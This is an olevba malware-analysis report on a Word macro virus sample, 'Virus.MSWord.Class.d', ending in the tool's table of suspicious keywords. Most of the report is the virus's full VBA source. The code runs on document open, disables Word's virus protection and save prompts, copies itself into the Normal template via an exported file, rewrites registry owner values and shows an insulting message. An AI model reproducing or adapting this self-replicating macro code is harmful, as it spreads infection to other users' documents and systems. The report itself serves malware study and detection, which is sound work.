olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.d-ab2c531ca442587e808183579cc35c311d770258
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.d-ab2c531ca442587e808183579cc35c311d770258 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Declare Function RegOpenKeyExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpSubKey As String, ByVal ulOptions As Long, ByVal samDesired As Long, phkResult As Long) As Long
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Private Declare Function RegSetValueExA Lib "advapi32.dll" (ByVal hKey As Long, ByVal lpValueName As String, ByVal Reserved As Long, ByVal dwType As Long, ByVal lpValue As String, ByVal cbData As Long) As Long
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Const REG_SZ As Long = 1
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Const HKEY_CURRENT_USER As Long = &H80000001
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Const HKEY_LOCAL_MACHINE As Long = &H80000002
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Sub AutoOpen()
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
On Error GoTo out
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Options.VirusProtection = False
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Options.SaveNormalPrompt = False
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Options.ConfirmConversions = False
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If nt > 70 And ad > 0 Then GoTo out
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If nt < 70 Then
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End If
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If Day(Now) = 14 And Month(Now) > 5 Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "Class.Poppy"
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
With host.codemodule
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    For x = 1 To 16
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    .deletelines 1
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    Next x
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End With
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If nt < 70 Then
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    With host.codemodule
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    .replaceline 1, "Sub AutoClose()"
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    .replaceline 91, "Sub ToolsMacro()"
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    For x = 70 To 81
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
        .deletelines 62
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    Next x
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    .replaceline 35, "    For x = 1 To 4"
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    End With
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End If
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If nt < 70 Then
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
u = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "Software\Microsoft\Windows\CurrentVersion", 0, KEY_ALL_ACCESS, k)
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
u = RegSetValueExA(k, "RegisteredOwner", 0, REG_SZ, "VicodinES /CB /TNN", 1)
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
u = RegSetValueExA(k, "RegisteredOrganization", 0, REG_SZ, "-(Dr. Diet Mountain Dew)-", 1)
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
u = RegCloseKey(k)
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End If
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
With host.codemodule
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    For x = 2 To 104 Step 2
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
    Next x
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End With
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
out:
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End Sub
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
Sub ViewVBCode()
'Kovoprojekta Brno a.s.22.1.1999 8:54:39HP LaserJet 4L on \\JHORAKOVA\HP LJ 4LSoD 399 CIPRES - Filtr.doc
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|RegOpenKeyExA       |May read or write registry keys              |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |advapi32.dll        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

